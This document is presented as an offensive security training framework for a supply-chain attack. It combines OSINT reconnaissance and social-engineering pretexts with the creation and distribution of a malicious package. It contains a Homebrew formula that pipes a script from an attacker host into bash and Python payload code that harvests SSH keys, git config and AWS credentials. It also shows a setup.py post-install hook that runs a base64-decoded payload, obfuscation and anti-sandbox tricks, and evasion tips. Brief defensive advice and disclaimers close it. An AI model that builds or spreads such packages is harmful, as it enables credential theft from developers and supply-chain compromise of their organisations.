# Offensive Security Training Framework
## Social Engineering + Package Exploitation + OSINT Integration

**Purpose:** Educational framework for understanding offensive security techniques
**Scope:** Personal training environment only
**Warning:** These techniques are for authorized testing and education only

---

## 1. HIGH-LEVEL SOCIAL ENGINEERING PLAN

### Phase 1: Reconnaissance (OSINT)
```
Objective: Gather intelligence on target environment
Timeline: 1-2 weeks in real engagement

Tools & Techniques:
├── Passive OSINT
│   ├── theHarvester - Email/subdomain enumeration
│   ├── Maltego - Relationship mapping
│   ├── Shodan - Infrastructure discovery
│   ├── GitHub/GitLab - Code repository mining
│   └── LinkedIn - Organizational structure
│
├── Active OSINT
│   ├── DNS enumeration (dnsenum, fierce)
│   ├── Network scanning (nmap)
│   └── Service fingerprinting
│
└── Data Aggregation
    ├── Build target profiles
    ├── Identify technology stack
    ├── Map organizational structure
    └── Identify high-value targets
```

**Key Intelligence Gathering:**
- Developer toolchains and workflows
- Package managers in use (npm, pip, gem, brew)
- Internal communication channels
- Trust relationships
- Security awareness level

### Phase 2: Pretext Development
```
Attack Vectors:
├── Authority (impersonate senior dev/security team)
├── Urgency (critical security update required)
├── Trust (familiar tools/legitimate-looking packages)
└── Reciprocity (helpful tool that solves real problem)

Delivery Mechanisms:
├── Email (phishing with malicious package)
├── Slack/Discord (community channels)
├── GitHub Issues/PRs (supply chain injection)
├── Package repositories (typosquatting)
└── Social media (developer communities)
```

### Phase 3: Execution
```
Attack Chain:
1. Initial contact (establish trust)
2. Package delivery (malicious dependency)
3. Execution trigger (install/update)
4. Persistence (background service)
5. Data exfiltration (staged collection)
6. Cleanup (remove evidence)
```

### Phase 4: Post-Exploitation
```
Objectives:
├── Maintain access
├── Lateral movement
├── Credential harvesting
└── Document findings
```

---

## 2. TARGETED PACKAGE PROGRAM DESIGN

### Architecture Overview
```
Malicious Package Structure:
├── package.json / formula.rb (legitimate-looking metadata)
├── preinstall/postinstall hooks (execution vectors)
├── core functionality (actual utility + payload)
├── obfuscation layer (evasion techniques)
└── C2 communication (command & control)
```

### Attack Vector 1: Typosquatting
```ruby
# Example: Homebrew Formula Typosquatting
# Target: "popular-tool" → Create: "popuIar-tool" (I vs l)

class PopuiarTool < Formula
  desc "Legitimate-looking description"
  homepage "https://github.com/fake-org/popular-tool"
  url "https://malicious-cdn.com/package.tar.gz"
  sha256 "..." # Valid checksum for malicious payload

  def install
    # Legitimate installation
    bin.install "popular-tool"

    # Malicious payload (obfuscated)
    system "curl -s https://attacker.com/stage1.sh | bash"
  end

  def post_install
    # Persistence mechanism
    (var/"log/popular-tool").mkpath
    # Background service that exfiltrates data
  end
end
```

### Attack Vector 2: Dependency Confusion
```
Scenario: Target uses internal package "company-utils"
Attack: Publish public "company-utils" with higher version

Internal: company-utils@1.2.0
Public:   company-utils@99.0.0 (malicious)

Package managers may prefer public version
```

### Attack Vector 3: Compromised Dependency
```
Attack Chain:
1. Identify widely-used package with few maintainers
2. Social engineer maintainer access
3. Release malicious update (minor version bump)
4. Thousands of downstream victims
```

### Payload Design
```python
# Example: Python Package Payload Structure

import os
import subprocess
import base64
import json
from pathlib import Path

class InnocentUtility:
    """Legitimate functionality"""

    def __init__(self):
        self._setup()  # Hidden malicious setup

    def _setup(self):
        """Malicious initialization"""
        # Gather OSINT on victim environment
        self._gather_env_info()
        # Establish persistence
        self._persist()
        # Phone home
        self._beacon()

    def _gather_env_info(self):
        """Collect environmental intelligence"""
        data = {
            'user': os.getenv('USER'),
            'home': str(Path.home()),
            'shell': os.getenv('SHELL'),
            'path': os.getenv('PATH'),
            'ssh_keys': self._find_ssh_keys(),
            'git_config': self._extract_git_config(),
            'aws_keys': self._find_aws_credentials(),
            'installed_packages': self._enumerate_packages(),
        }
        return data

    def _find_ssh_keys(self):
        """Locate SSH keys"""
        ssh_dir = Path.home() / '.ssh'
        if ssh_dir.exists():
            return list(ssh_dir.glob('id_*'))
        return []

    def _persist(self):
        """Establish persistence"""
        # LaunchAgent (macOS)
        # systemd service (Linux)
        # Scheduled task (Windows)
        pass

    def _beacon(self):
        """Callback to C2 server"""
        # Encrypted communication
        # DNS tunneling, HTTPS, etc.
        pass

    # Actual legitimate functionality below
    def useful_function(self):
        """This actually works to avoid suspicion"""
        return "Legitimate output"
```

### Obfuscation Techniques
```python
# Technique 1: Base64 encoding
import base64
exec(base64.b64decode('aW1wb3J0IG9z...'))

# Technique 2: Dynamic imports
__import__('os').system('malicious command')

# Technique 3: Delayed execution
import threading
threading.Timer(3600, malicious_function).start()

# Technique 4: Environment checks (anti-sandbox)
if os.path.exists('/usr/local/bin/brew'):  # Only run on real systems
    malicious_function()

# Technique 5: String obfuscation
url = ''.join(chr(x) for x in [104,116,116,112,115,...])
```

---

## 3. OSINT TOOLS & INTEGRATION

### Pre-Attack Intelligence Gathering

#### Tool Suite
```bash
# Network & Infrastructure OSINT
├── nmap           # Network discovery
├── masscan        # Fast port scanner
├── Shodan         # Internet-wide scan data
├── Censys         # Certificate transparency
└── DNSRecon       # DNS enumeration

# Social & Corporate OSINT
├── theHarvester   # Email/domain scraping
├── Maltego        # Relationship visualization
├── SpiderFoot     # Automated OSINT
├── Recon-ng       # OSINT framework
└── OSINT Framework # Tool directory

# Developer-Specific OSINT
├── GitDorker      # GitHub secret scanning
├── TruffleHog     # Git credential scanner
├── Gitrob         # GitHub org analyzer
└── gh-dork        # GitHub dork queries

# Package Ecosystem OSINT
├── npm-audit      # NPM vulnerability scan
├── safety         # Python dependency check
├── bundler-audit  # Ruby gem scanner
└── brew-audit     # Homebrew formula check
```

#### OSINT Workflow
```
┌─────────────────────────────────────────────┐
│  PHASE 1: PASSIVE RECONNAISSANCE            │
├─────────────────────────────────────────────┤
│ 1. Domain enumeration                       │
│    - Subdomains (Amass, Subfinder)         │
│    - SSL certificates (crt.sh)             │
│    - DNS records                            │
│                                             │
│ 2. Organization mapping                     │
│    - LinkedIn employee list                 │
│    - GitHub organization members            │
│    - Tech stack identification              │
│                                             │
│ 3. Repository analysis                      │
│    - Public repos (leaked credentials?)     │
│    - Dependency analysis                    │
│    - Code patterns & practices              │
└─────────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────────┐
│  PHASE 2: ACTIVE RECONNAISSANCE             │
├─────────────────────────────────────────────┤
│ 1. Network probing                          │
│    - Port scanning                          │
│    - Service enumeration                    │
│    - Version detection                      │
│                                             │
│ 2. Package ecosystem profiling              │
│    - Package.json/requirements.txt exposure │
│    - Gemfile.lock public repos              │
│    - Brewfile detection                     │
└─────────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────────┐
│  PHASE 3: TARGET PROFILING                  │
├─────────────────────────────────────────────┤
│ 1. Build victim profile                     │
│    - Tech stack                             │
│    - Development workflow                   │
│    - Security posture                       │
│    - Trust relationships                    │
│                                             │
│ 2. Identify attack surface                  │
│    - Package managers used                  │
│    - Update frequency                       │
│    - Security awareness level               │
└─────────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────────┐
│  PHASE 4: WEAPONIZATION                     │
├─────────────────────────────────────────────┤
│ Create targeted package that:               │
│ - Mimics legitimate tools they use          │
│ - Solves a real problem (trojan horse)      │
│ - Passes basic security checks              │
│ - Blends with their workflow                │
└─────────────────────────────────────────────┘
```

### OSINT Integration with Package Attack

```python
#!/usr/bin/env python3
"""
OSINT-Enhanced Package Payload
Adapts behavior based on victim environment
"""

import os
import platform
import subprocess
import json
import requests
from pathlib import Path

class AdaptivePayload:
    """Payload that uses OSINT to adapt to environment"""

    def __init__(self):
        self.profile = self._build_profile()
        self._adapt_to_environment()

    def _build_profile(self):
        """Build comprehensive victim profile"""
        profile = {
            'system': {
                'os': platform.system(),
                'release': platform.release(),
                'arch': platform.machine(),
                'hostname': platform.node(),
            },
            'user': {
                'username': os.getenv('USER'),
                'home': str(Path.home()),
                'shell': os.getenv('SHELL'),
            },
            'development': {
                'git': self._check_git_config(),
                'ssh': self._check_ssh_keys(),
                'aws': self._check_aws_credentials(),
                'docker': self._check_docker(),
                'kubernetes': self._check_kubernetes(),
            },
            'packages': {
                'brew': self._enumerate_brew(),
                'npm': self._enumerate_npm(),
                'pip': self._enumerate_pip(),
                'gem': self._enumerate_gems(),
            },
            'network': {
                'interfaces': self._get_network_info(),
                'dns': self._get_dns_servers(),
            }
        }
        return profile

    def _adapt_to_environment(self):
        """Modify behavior based on profile"""

        # If AWS credentials found, exfiltrate cloud resources
        if self.profile['development']['aws']:
            self._enumerate_aws_resources()

        # If Docker found, attempt container escape
        if self.profile['development']['docker']:
            self._docker_operations()

        # If K8s found, attempt cluster access
        if self.profile['development']['kubernetes']:
            self._k8s_operations()

        # Adapt C2 channel based on network
        self._establish_c2()

    def _check_git_config(self):
        """Extract Git configuration"""
        git_config = Path.home() / '.gitconfig'
        if git_config.exists():
            try:
                with open(git_config) as f:
                    return f.read()
            except:
                pass
        return None

    def _enumerate_brew(self):
        """List installed Homebrew packages"""
        try:
            result = subprocess.run(
                ['brew', 'list', '--versions'],
                capture_output=True, text=True, timeout=5
            )
            return result.stdout.strip().split('\n')
        except:
            return []

    def _establish_c2(self):
        """Establish command & control channel"""
        # Use DNS tunneling if direct HTTP blocked
        # Use HTTPS if allowed
        # Use legitimate services (GitHub, Pastebin, etc.)
        pass

    # Additional methods...
```

---

## 4. COMPLETE ATTACK SCENARIO

### Scenario: Developer Package Compromise

#### Target Profile (from OSINT)
```
Company: TechCorp Inc.
Target: Backend development team
Size: ~50 developers
Stack: Python, Node.js, Homebrew (macOS)
Repos: Multiple public GitHub repos
Security: Basic (no 2FA on most accounts)
```

#### Attack Execution

**Step 1: OSINT Reconnaissance**
```bash
# Enumerate organization
theHarvester -d techcorp.com -b all

# Find public repos
gh repo list techcorp --limit 1000

# Analyze dependencies
for repo in $(gh repo list techcorp --json name -q '.[].name'); do
  gh repo clone techcorp/$repo /tmp/$repo
  find /tmp/$repo -name "requirements.txt" -o -name "package.json"
done

# Identify common internal packages
grep -r "techcorp-" /tmp/*/requirements.txt | cut -d: -f2 | sort | uniq -c
```

**Step 2: Social Engineering Pretext**
```
Vector: Create "helpful" package that solves real problem
Name: "techcorp-deploy-tools" (internal-sounding)
Description: "Streamlined deployment utilities for TechCorp services"
Functionality: Actually provides useful CLI tools
Malicious: Includes hidden credential harvester
```

**Step 3: Package Creation**
```python
# setup.py
from setuptools import setup
from setuptools.command.install import install
import subprocess
import base64

class PostInstall(install):
    def run(self):
        install.run(self)
        # Malicious post-install
        payload = base64.b64decode('PHNjcmlwdD4uLi48L3NjcmlwdD4=')
        subprocess.run(['bash', '-c', payload.decode()])

setup(
    name='techcorp-deploy-tools',
    version='1.0.0',
    description='Deployment utilities for TechCorp',
    author='TechCorp DevOps',  # Spoofed
    install_requires=[
        'click',
        'requests',
        'pyyaml',
    ],
    cmdclass={
        'install': PostInstall,
    },
)
```

**Step 4: Distribution**
```
Channels:
1. Upload to PyPI (typosquatting)
2. Post in developer Slack: "Found this useful tool"
3. Submit GitHub PR with dependency addition
4. Plant in internal wiki as "recommended tool"
```

**Step 5: Post-Compromise**
```python
# Payload behavior after installation
def post_compromise():
    # Gather credentials
    credentials = {
        'aws': extract_aws_credentials(),
        'ssh': extract_ssh_keys(),
        'git': extract_git_credentials(),
        'env': extract_env_files(),
    }

    # Establish persistence
    install_launchagent()  # macOS

    # Beacon to C2
    exfiltrate_data(credentials)

    # Lateral movement
    attempt_ssh_to_internal_hosts()
    attempt_aws_operations()
```

---

## 5. DETECTION & DEFENSE (Red Team Perspective)

### What Blue Team Should Detect
```
Detection Points:
├── Package installation monitoring
├── Unexpected network connections
├── File system monitoring (credential access)
├── Process monitoring (suspicious child processes)
└── Anomalous package names/versions

Blue Team Tools:
├── Osquery (endpoint visibility)
├── Falco (runtime security)
├── Little Snitch (network monitor)
├── Package hash verification
└── SBOMs (Software Bill of Materials)
```

### Evasion Techniques (for testing detection)
```
1. Time-delayed execution (avoid immediate detection)
2. Legitimate-looking behavior (blend with normal activity)
3. Encrypted C2 channels (avoid network inspection)
4. Anti-sandbox checks (only run on real systems)
5. Living off the land (use built-in tools)
```

---

## 6. TRAINING EXERCISES

### Exercise 1: OSINT Reconnaissance
```
Objective: Profile your own GitHub account
Tasks:
1. Use theHarvester on your email domain
2. Enumerate your public repositories
3. Scan for exposed credentials with TruffleHog
4. Map your technology stack
5. Document findings

Learning: Understand attacker perspective
```

### Exercise 2: Package Analysis
```
Objective: Identify malicious packages
Tasks:
1. Review suspicious packages on PyPI/NPM
2. Analyze setup.py/package.json for hooks
3. Decompile obfuscated code
4. Trace network connections
5. Document IOCs

Learning: Recognize malicious patterns
```

### Exercise 3: Create Training Payload (Isolated Lab)
```
Objective: Build educational malicious package
Requirements:
- Isolated VM/container only
- No real credentials
- Document every technique
- Include detection points

Learning: Understand attack mechanics
```

### Exercise 4: Social Engineering Simulation
```
Objective: Craft believable pretext
Tasks:
1. Research target organization (yourself/test company)
2. Build target profile from OSINT
3. Design pretext (email/package/message)
4. Identify psychological triggers
5. Document success factors

Learning: Understand social manipulation
```

---

## 7. DEFENSIVE RECOMMENDATIONS

### For Developers
```
✓ Enable 2FA on all accounts
✓ Verify package authenticity (checksums, signatures)
✓ Review package source code before installation
✓ Use dependency lock files
✓ Monitor package updates
✓ Principle of least privilege
✓ Isolate development environments
✓ Regular security training
```

### For Organizations
```
✓ Package manager proxies (Artifactory, Nexus)
✓ Dependency scanning (Snyk, Dependabot)
✓ SBOM generation and tracking
✓ Network segmentation
✓ EDR/XDR solutions
✓ Security awareness training
✓ Incident response procedures
✓ Supply chain security program
```

---

## 8. LEGAL & ETHICAL CONSIDERATIONS

**CRITICAL REMINDERS:**

⚠️ Only test on systems you own or have explicit authorization to test
⚠️ Unauthorized access is illegal (CFAA, similar laws worldwide)
⚠️ Creating malicious packages for real repositories = supply chain attack
⚠️ Social engineering without authorization = fraud/impersonation
⚠️ Document authorization before any testing
⚠️ Maintain ethical boundaries

**Safe Practice:**
- Use isolated lab environments
- Never deploy to real package repositories
- Don't test on others without written permission
- Focus on defensive applications
- Report vulnerabilities responsibly

---

## 9. RESOURCES

### Books
- "The Art of Deception" - Kevin Mitnick
- "Ghost in the Wires" - Kevin Mitnick
- "Social Engineering: The Art of Human Hacking" - Christopher Hadnagy

### Frameworks
- MITRE ATT&CK (T1195.001 - Supply Chain Compromise)
- OWASP Top 10
- Social Engineering Framework (SEF)

### Tools
- SET (Social Engineering Toolkit)
- Gophish (phishing simulation)
- SpiderFoot (OSINT automation)
- Maltego (relationship mapping)

### Labs
- HackTheBox
- TryHackMe
- PentesterLab
- OWASP WebGoat

---

## CONCLUSION

This framework demonstrates the complete attack chain:
1. **OSINT** → Intelligence gathering
2. **Social Engineering** → Human manipulation
3. **Package Compromise** → Technical exploitation
4. **Post-Exploitation** → Achieve objectives

**Key Takeaways:**
- Supply chain attacks are highly effective
- Social engineering amplifies technical attacks
- OSINT provides crucial targeting intelligence
- Defense requires multi-layered approach
- Awareness is the first line of defense

**Next Steps for Training:**
1. Set up isolated lab environment
2. Practice OSINT techniques
3. Analyze real-world attacks
4. Develop detection capabilities
5. Build defensive mindset

---

*This document is for educational purposes only. Always operate within legal and ethical boundaries.*
